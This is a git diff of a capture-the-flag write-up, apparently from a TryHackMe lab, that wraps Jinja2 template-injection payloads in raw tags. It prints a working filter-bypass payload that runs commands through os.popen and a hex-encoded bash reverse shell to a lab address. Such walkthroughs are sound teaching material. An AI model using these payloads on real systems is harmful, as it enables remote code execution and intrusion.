@@ -67,9 +67,11 @@ And yes is is really vulnerable to SSTI :
 
 I noticed that there is a filtering on the input provided by the user :
 
-```python
-self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()
+{% raw %}
+```js
+{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
 ```
+{% endraw %}
 
 ![Alt text](<../../../assets/images/THMPics/Pasted image 20231106111411.png>)
 
@@ -77,9 +79,11 @@ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()
 
 After a lot of tries I found the right payload :
 
-```python
-request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()
+{% raw %}
+```js
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
+{% endraw %}
 
 ![Alt text](<../../../assets/images/THMPics/Pasted image 20231106113521.png>)
 
@@ -87,9 +91,11 @@ Now I will try to get a reverse shell :
 
 ![Alt text](<../../../assets/images/THMPics/Pasted image 20231106114320.png>)
 
-```python
-request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x62\x61\x73\x68\x20\x2d\x63\x20\x27\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x39\x2e\x31\x2e\x31\x31\x37\x2f\x39\x39\x39\x39\x20\x30\x3e\x26\x31\x27')|attr('read')()
+{% raw %}
+```js
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x62\x61\x73\x68\x20\x2d\x63\x20\x27\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x39\x2e\x31\x2e\x31\x31\x37\x2f\x39\x39\x39\x39\x20\x30\x3e\x26\x31\x27')|attr('read')()}}
 ```
+{% endraw %}
 
 And I am in as web user :
 
